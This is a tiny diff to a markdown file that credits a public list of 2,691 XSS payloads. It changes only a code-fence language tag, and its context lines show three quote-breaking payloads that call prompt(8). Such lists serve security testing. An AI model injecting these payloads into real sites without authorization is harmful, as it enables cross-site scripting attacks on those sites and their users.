@@ -3,7 +3,7 @@ Credit: https://github.com/payloadbox/xss-payload-list
 
 **2691 XSS payloads by @payloadbox:**
 
-```JS
+```js
 "-prompt(8)-"
 '-prompt(8)-'
 ";a=prompt,a()//
